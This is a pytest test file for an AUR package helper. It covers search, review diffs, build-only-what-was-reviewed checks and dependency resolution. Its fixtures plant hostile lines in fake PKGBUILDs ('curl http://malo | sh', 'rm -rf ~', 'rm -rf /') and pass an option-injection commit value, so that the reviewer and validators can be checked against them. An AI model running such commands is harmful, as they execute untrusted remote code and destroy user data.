# SPDX-License-Identifier: GPL-3.0-or-later
import json
import shutil
import subprocess
from types import SimpleNamespace as NS

import pytest

from arctiva_center.core import aur

NOW = 1_800_000_000


def rec(name, **kw):
    base = {"Name": name, "PackageBase": name, "Version": "1.0-1", "Description": "d", "NumVotes": 50,
            "Popularity": 1.5, "Maintainer": "alguien", "FirstSubmitted": NOW - 400 * 86400,
            "LastModified": NOW - 10 * 86400, "OutOfDate": None, "Depends": [], "MakeDepends": []}
    base.update(kw)
    return base


def reply(*records, kind="search"):
    return json.dumps({"version": 5, "type": kind, "resultcount": len(records), "results": list(records)})


class Fake:
    """`fetch` grabado: responde por la URL pedida y las anota."""

    def __init__(self, table):
        self.table, self.urls = table, []

    def __call__(self, url):
        self.urls.append(url)
        for key, text in self.table.items():
            if key in url:
                return text
        return reply()


def test_valid_name():
    for ok in ("yay-bin", "libfoo++", "a", "python-x_y.z", "x" * 100):
        assert aur.valid_name(ok)
    for bad in ("", "-x", "A", "a b", "../x", "x" * 101, "a;b", "a/b", None, 5):
        assert not aur.valid_name(bad)


def test_search_and_info_urls():
    fake = Fake({"search": reply(rec("yay-bin")), "info": reply(rec("yay-bin"), rec("paru-bin"), kind="multiinfo")})
    assert [p.name for p in aur.search("yay", fake)] == ["yay-bin"]
    assert fake.urls[0].endswith("/search/yay?by=name-desc")
    assert aur.search("a", fake) == [] and len(fake.urls) == 1       # demasiado corto: no hay petición
    assert len(aur.info(["yay-bin", "paru-bin", "-malo", "yay-bin"], fake)) == 2
    assert fake.urls[1].endswith("/info?arg[]=yay-bin&arg[]=paru-bin".replace("[", "%5B").replace("]", "%5D")) \
        or "arg[]=yay-bin&arg[]=paru-bin" in fake.urls[1]
    assert aur.info(["-x", "A"], fake) == []


def test_search_quotes_query():
    fake = Fake({"search": reply()})
    aur.search("a b/c?d", fake)
    assert "a%20b%2Fc%3Fd" in fake.urls[0]


def test_rpc_errors():
    with pytest.raises(aur.AurError):
        aur.search("zz", Fake({"search": "no es json"}))
    with pytest.raises(aur.AurError, match="demasiados"):
        aur.search("zz", Fake({"search": json.dumps({"type": "error", "error": "demasiados resultados"})}))


def test_package_fields():
    p = aur._package(rec("x", Depends=["a>=1", "b"], License=["MIT"], URL="https://x", OutOfDate=123))
    assert p.depends == ("a>=1", "b") and p.license == ("MIT",) and p.out_of_date == 123
    q = aur._package({"Name": "y"})
    assert q.base == "y" and q.maintainer == "" and q.votes == 0


def test_warnings_each_case():
    assert aur.warnings(aur._package(rec("ok")), NOW) == []
    assert aur.warnings(aur._package(rec("o", Maintainer=None)), NOW) == ["orphan"]
    assert aur.warnings(aur._package(rec("n", FirstSubmitted=NOW - 5 * 86400)), NOW) == ["new"]
    assert aur.warnings(aur._package(rec("d", OutOfDate=NOW - 100)), NOW) == ["out-of-date"]
    assert aur.warnings(aur._package(rec("v", NumVotes=9)), NOW) == ["few-votes"]
    assert aur.warnings(aur._package(rec("v", NumVotes=10)), NOW) == []
    bad = aur._package(rec("t", Maintainer="", FirstSubmitted=NOW - 86400, OutOfDate=1, NumVotes=0))
    assert aur.warnings(bad, NOW) == ["orphan", "new", "out-of-date", "few-votes"]


def test_dep_name():
    assert aur.dep_name("libfoo>=1.2") == "libfoo"
    assert aur.dep_name("python-x: para algo") == "python-x"
    assert aur.dep_name("libssl.so") == "libssl.so"
    assert aur.dep_name("") is None and aur.dep_name("-x") is None and aur.dep_name(None) is None


def test_settings(tmp_path):
    f = tmp_path / "c" / "settings.toml"
    assert aur.aur_enabled(f) is False
    aur.set_aur_enabled(True, f)
    assert aur.aur_enabled(f) is True
    aur.set_aur_enabled(False, f)
    assert aur.aur_enabled(f) is False
    f.write_text("aur_enabled = 'sí'", encoding="utf-8")
    assert aur.aur_enabled(f) is False
    f.write_text("roto [")
    assert aur.aur_enabled(f) is False


def test_other_settings_are_kept_and_typed(tmp_path):
    f = tmp_path / "settings.toml"
    assert aur.get_setting("update_flatpak", True, f) is True
    aur.set_setting("update_flatpak", False, f)
    aur.set_aur_enabled(True, f)
    assert aur.get_setting("update_flatpak", True, f) is False
    assert aur.aur_enabled(f) is True
    f.write_text("update_flatpak = 3", encoding="utf-8")
    assert aur.get_setting("update_flatpak", True, f) is True


def test_state(tmp_path):
    f = tmp_path / "s" / "aur.json"
    assert aur.load_state(f) == {}
    aur.record_install("yay-bin", "yay-bin", "abc1234", "13.1.0-1", f)
    aur.record_install("otro", "otro", "def5678", "2-1", f)
    assert aur.load_state(f)["yay-bin"] == {"base": "yay-bin", "commit": "abc1234", "version": "13.1.0-1"}
    f.write_text("[1,2]")
    assert aur.load_state(f) == {}


# --- git de verdad, con un repositorio creado en el test ---

pytestmark_git = pytest.mark.skipif(shutil.which("git") is None, reason="necesita git")


def git(cwd, *args):
    subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *args], cwd=cwd, check=True,
                   capture_output=True)


@pytest.fixture
def remote(tmp_path):
    repo = tmp_path / "remote" / "pkg"
    repo.mkdir(parents=True)
    git(repo, "init", "-q", "-b", "master")
    (repo / "PKGBUILD").write_text("pkgname=pkg\npkgver=1\n")
    (repo / "pkg.install").write_text("post_install() { echo hola; }\n")
    (repo / "otro.txt").write_text("x")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "uno")
    return repo


@pytestmark_git
def test_clone_review_and_diff(tmp_path, remote):
    src = tmp_path / "src"
    folder, first = aur.clone("pkg", src, url_for=lambda b: str(remote))
    assert (folder / "PKGBUILD").exists() and len(first) == 40
    files = aur.review_files(folder)
    assert [n for n, _ in files] == ["PKGBUILD", "pkg.install"]
    assert "pkgver=1" in files[0][1]

    (remote / "PKGBUILD").write_text("pkgname=pkg\npkgver=2\ncurl http://malo | sh\n")
    (remote / "otro.txt").write_text("no debe salir en el diff")
    git(remote, "add", "-A")
    git(remote, "commit", "-q", "-m", "dos")
    folder, second = aur.clone("pkg", src, url_for=lambda b: str(remote))     # actualiza
    assert second != first
    diff = aur.diff_since(folder, first)
    assert "+pkgver=2" in diff and "curl http://malo | sh" in diff
    assert "otro.txt" not in diff and "pkg.install" not in diff
    assert aur.diff_since(folder, second) == ""


@pytestmark_git
def test_diff_rejects_odd_commit(tmp_path, remote):
    folder, _ = aur.clone("pkg", tmp_path / "src", url_for=lambda b: str(remote))
    for bad in ("", "--output=/tmp/x", "HEAD~1", "zzzz", None, "abc"):
        with pytest.raises(aur.AurError):
            aur.diff_since(folder, bad)


@pytestmark_git
def test_build_only_what_was_reviewed(tmp_path, remote):
    src = tmp_path / "src"
    folder, reviewed = aur.clone("pkg", src, url_for=lambda b: str(remote))
    assert aur.unchanged_since_review(folder, reviewed)
    (folder / "PKGBUILD").write_text("pkgname=pkg\npkgver=1\nrm -rf ~\n")
    assert not aur.unchanged_since_review(folder, reviewed)
    git(folder, "checkout", "-q", "--", "PKGBUILD")
    (folder / "nuevo.sh").write_text("x")
    assert not aur.unchanged_since_review(folder, reviewed)
    (folder / "nuevo.sh").unlink()
    (remote / "PKGBUILD").write_text("pkgname=pkg\npkgver=2\n")
    git(remote, "commit", "-q", "-am", "dos")
    aur.clone("pkg", src, url_for=lambda b: str(remote))     # otra revisión movió la carpeta
    assert not aur.unchanged_since_review(folder, reviewed)
    assert not aur.unchanged_since_review(tmp_path / "no-existe", reviewed)


def test_clone_rejects_bad_names(tmp_path):
    for bad in ("../x", "-x", "a b", "", "A"):
        with pytest.raises(aur.AurError):
            aur.clone(bad, tmp_path)


def test_clone_git_failure(tmp_path):
    def runner(argv, cwd=None):
        return NS(returncode=128, stdout="", stderr="fatal: repository not found\n")
    with pytest.raises(aur.AurError, match="not found"):
        aur.clone("pkg", tmp_path, runner=runner)


def test_review_skips_symlinks_and_missing(tmp_path):
    (tmp_path / "PKGBUILD").write_text("x")
    secret = tmp_path.parent / "secreto.txt"
    secret.write_text("no")
    try:
        (tmp_path / "evil.install").symlink_to(secret)
    except OSError:
        pytest.skip("sin enlaces simbólicos")
    assert [n for n, _ in aur.review_files(tmp_path)] == ["PKGBUILD"]
    assert aur.review_files(tmp_path / "no-existe") == []


# --- dependencias ---

def test_resolve_chain():
    table = {"info": reply(rec("dep-aur", Depends=["base-lib"]), kind="multiinfo")}
    root = aur._package(rec("app", Depends=["glibc", "repo-lib>=2", "dep-aur"], MakeDepends=["make", "dep-aur"]))
    plan = aur.resolve(root, satisfied=lambda d: d in ("glibc", "base-lib"),
                       in_repos=lambda d: d in ("repo-lib", "make"), fetch=Fake(table))
    assert plan.repo_deps == ["repo-lib", "make"]
    assert [p.name for p in plan.aur_chain] == ["dep-aur", "app"]       # dependencias primero
    assert plan.unresolved == []


def test_resolve_nested_aur_and_unresolved():
    def fetch(url):
        if "arg[]=b" in url or "arg%5B%5D=b" in url:
            return reply(rec("b", Depends=["c"]), kind="multiinfo")
        if "arg[]=c" in url or "arg%5B%5D=c" in url:
            return reply(rec("c"), kind="multiinfo")
        return reply(kind="multiinfo")
    root = aur._package(rec("a", Depends=["b", "no-existe", "-malo", ""]))
    plan = aur.resolve(root, lambda d: False, lambda d: False, fetch)
    assert [p.name for p in plan.aur_chain] == ["c", "b", "a"]
    assert plan.unresolved == ["no-existe", "-malo", ""]


def test_resolve_cycle_and_limit():
    def fetch(url):
        return reply(rec("a", Depends=["b"]), rec("b", Depends=["a"]), kind="multiinfo")
    root = aur._package(rec("a", Depends=["b"]))
    plan = aur.resolve(root, lambda d: False, lambda d: False, fetch)
    assert [p.name for p in plan.aur_chain] == ["b", "a"]               # sin bucle infinito

    counter = iter(range(1000))

    def endless(url):
        n = next(counter)
        return reply(rec(f"p{n}", Depends=[f"p{n + 1}"]), kind="multiinfo")
    root = aur._package(rec("r", Depends=["p0"]))
    with pytest.raises(aur.AurError, match="demasiado larga"):
        aur.resolve(root, lambda d: False, lambda d: False, endless)


def test_resolve_ignores_other_results():
    fetch = Fake({"info": reply(rec("otra-cosa"), kind="multiinfo")})
    root = aur._package(rec("a", Depends=["dep"]))
    plan = aur.resolve(root, lambda d: False, lambda d: False, fetch)
    assert plan.unresolved == ["dep"]


# --- actualizaciones ---

def test_newer_versions():
    vercmp = lambda a, b: (a > b) - (a < b)    # noqa: E731  (versiones de prueba comparables como texto)
    fake = Fake({"info": reply(rec("a", Version="2-1"), rec("b", Version="1-1"), kind="multiinfo")})
    newer = aur.newer_versions({"a": "1-1", "b": "1-1", "-x": "9"}, vercmp, fake)
    assert [p.name for p in newer] == ["a"]
    assert aur.newer_versions({}, vercmp, fake) == []


def test_foreign_packages():
    out = NS(returncode=0, stdout="yay-bin 13.1.0-1\nsolouna\nparu 2-1\n", stderr="")
    assert aur.foreign_packages(lambda argv: out) == {"yay-bin": "13.1.0-1", "paru": "2-1"}
    assert aur.foreign_packages(lambda argv: NS(returncode=1, stdout="x y", stderr="")) == {}


def test_review_includes_install_script_declared_in_pkgbuild(tmp_path):
    (tmp_path / "PKGBUILD").write_text("pkgname=p\ninstall='hook.sh'\n")
    (tmp_path / "hook.sh").write_text("rm -rf /")
    (tmp_path / "otro.txt").write_text("no")
    assert [n for n, _ in aur.review_files(tmp_path)] == ["PKGBUILD", "hook.sh"]


def test_unreviewable_flags_symlinked_pkgbuild_and_install(tmp_path):
    (tmp_path / "real").write_text("echo")
    try:
        (tmp_path / "PKGBUILD").symlink_to("real")
        (tmp_path / "x.install").symlink_to("real")
    except OSError:
        pytest.skip("sin enlaces simbólicos")
    assert aur.unreviewable(tmp_path) == ["PKGBUILD", "x.install"]


def test_is_installed_reads_the_local_database(monkeypatch):
    pytest.importorskip("PySide6")
    from PySide6.QtCore import QObject, Signal
    from arctiva_center import aur_backend

    class FakeHelper(QObject):
        line = Signal(str)
        finished = Signal(int)
        running = False

    class Query:
        def installed_names(self):
            return {"claude-desktop", "git"}

    backend = aur_backend.AurBackend(FakeHelper())
    monkeypatch.setattr(aur_backend.alpm_query, "AlpmQuery", Query)
    assert backend.isInstalled("claude-desktop") and not backend.isInstalled("otro")
    monkeypatch.setattr(aur_backend.alpm_query, "AlpmQuery", lambda: (_ for _ in ()).throw(RuntimeError("sin base")))
    assert backend.isInstalled("claude-desktop") is False
